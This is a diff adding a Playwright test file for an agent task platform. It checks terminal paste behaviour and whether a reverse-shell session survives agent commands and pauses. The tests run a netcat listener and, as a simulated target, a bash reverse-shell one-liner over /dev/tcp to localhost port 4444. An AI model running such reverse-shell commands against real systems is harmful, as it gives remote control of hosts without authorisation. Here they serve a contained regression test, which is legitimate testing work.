@@ -1,0 +1,87 @@
+import { test, expect, createTask, mockReset, openTask, send, termText, waitIdle, type Ids } from "./helpers";
+
+// Регрессии живых сессий: (1) вставка Ctrl+Shift+V в пользовательский shell не должна дублироваться
+// (ручной clipboard.readText + term.paste поверх родной вставки браузера в xterm-textarea);
+// (2) reverse shell через job-листенер должен переживать обычные команды агента (их sweep),
+// открытие пользовательского терминала и паузы — tmux-сессии jobs от этого умирать не должны.
+type Call = { name: string; args: Record<string, unknown> };
+const tt = (...rounds: Call[][]) => `[[tt:${Buffer.from(JSON.stringify({ rounds })).toString("base64url")}]] [[nomem]]`;
+const sh = (command: string): Call => ({ name: "shell", args: { command } });
+
+test.describe("стабильность shell-сессий", () => {
+  let ids: Ids;
+  test.beforeAll(async ({ request }) => { ids = await createTask(request, "Стабильность шеллов"); });
+  test.beforeEach(async ({ request }) => { await mockReset(request); });
+
+  test("вставка Ctrl+Shift+V в терминал вставляется один раз, не дважды", async ({ page }) => {
+    test.setTimeout(120_000);
+    await openTask(page, ids);
+    await expect(page.getByTestId("term-shell")).toHaveAttribute("data-ws", "open", { timeout: 20_000 });
+    await expect.poll(() => termText(page, "shell"), { timeout: 20_000 }).toMatch(/root@task-\w+/);
+    await page.context().grantPermissions(["clipboard-read", "clipboard-write"], { origin: new URL(page.url()).origin });
+    await page.evaluate(() => navigator.clipboard.writeText("echo WHPASTE42"));
+    await page.getByTestId("term-shell").locator(".xterm-helper-textarea").focus();
+    await page.keyboard.press("Control+Shift+V");
+    await page.waitForTimeout(600);
+    await page.keyboard.press("Enter");
+    await expect.poll(async () => {
+      const t = await termText(page, "shell");
+      const lines = t.split("\n").map((l) => l.trim());
+      return {
+        standalone: lines.filter((l) => l === "WHPASTE42").length,
+        glued: (t.match(/WHPASTE42echo/g) ?? []).length,
+      };
+    }, { timeout: 15_000 }).toEqual({ standalone: 1, glued: 0 });
+  });
+
+  test("reverse shell в job-листенере живёт сквозь команды агента, пользовательский терминал и паузу", async ({ page, request }) => {
+    test.setTimeout(240_000);
+    const jobOut = async (jobId: string) =>
+      (await (await request.get(`/api/tasks/${ids.task.id}/jobs/${jobId}/output?lines=120`)).json()).output as string;
+    const jobIn = async (jobId: string, text: string) => {
+      const r = await request.post(`/api/tasks/${ids.task.id}/jobs/${jobId}/input`, { data: { text } });
+      expect(r.ok(), await r.text()).toBeTruthy();
+    };
+
+    const listener = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
+      data: { name: "listener-4444", command: "nc -lkvp 4444" },
+    })).json();
+    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toMatch(/listening/i);
+
+    // «цель» из того же контейнера: настоящий интерактивный bash по TCP в листенер
+    const target = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
+      data: { name: "target-sim", command: "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" },
+    })).json();
+    await jobIn(listener.id, "echo WHREV-$((20+22))");
+    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("WHREV-42");
+    await jobIn(listener.id, "id");
+    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("uid=");
+
+    // возмущения: обычная команда агента (execStream со sweep), пользовательский терминал, пауза
+    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
+    await openTask(page, { task: ids.task, chat });
+    await send(page, tt([sh("echo DISTURB-AGENT")]));
+    await waitIdle(page);
+    await expect(page.getByTestId("term-shell")).toHaveAttribute("data-ws", "open", { timeout: 20_000 });
+    await expect.poll(() => termText(page, "shell"), { timeout: 20_000 }).toMatch(/root@task-\w+/);
+    await page.waitForTimeout(5000);
+
+    await jobIn(listener.id, "echo STILL-ALIVE-$((6*7))");
+    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("STILL-ALIVE-42");
+    const list = await (await request.get(`/api/tasks/${ids.task.id}/jobs`)).json();
+    expect(list.find((j: any) => j.id === listener.id)?.running).toBe(true);
+    expect(list.find((j: any) => j.id === target.id)?.running).toBe(true);
+
+    // обрыв шелла (цель умерла/ресетнулась): с -k листенер слушает дальше и принимает следующий коннект
+    await request.post(`/api/tasks/${ids.task.id}/jobs/${target.id}/stop`);
+    await page.waitForTimeout(1000);
+    const target2 = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
+      data: { name: "target-sim-2", command: "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" },
+    })).json();
+    await jobIn(listener.id, "echo AGAIN-$((100+1))");
+    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("AGAIN-101");
+
+    await request.post(`/api/tasks/${ids.task.id}/jobs/${target2.id}/stop`);
+    await request.post(`/api/tasks/${ids.task.id}/jobs/${listener.id}/stop`);
+  });
+});
